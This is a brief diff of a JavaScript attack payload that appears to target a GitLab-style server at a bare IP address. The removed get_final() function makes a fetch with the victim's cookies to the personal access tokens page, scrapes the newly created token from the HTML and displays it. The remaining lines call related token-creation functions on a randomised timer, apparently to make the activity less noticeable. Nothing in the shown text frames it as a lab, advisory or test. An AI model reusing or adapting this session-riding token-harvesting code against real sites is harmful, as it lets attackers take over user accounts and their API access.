@@ -1,16 +1,3 @@
-function get_final() {
-  fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
-  "body": null,
-  "method": "GET",
-  "credentials": "include"
-}).then(response => response.text())
-  .then(text => {
-    const parser = new DOMParser();
-    const htmlDocument = parser.parseFromString(text, "text/html");
-    const val = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
-    alert(val);
-  });
-}
 
 function get_access(token) {
   fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
@@ -59,5 +46,5 @@ setTimeout(function () {
     var runner = true;
     get_token();
   }
-  }, Math.floor(Math.random() * 1000));
+  }, Math.floor(Math.random() * 10000));
 
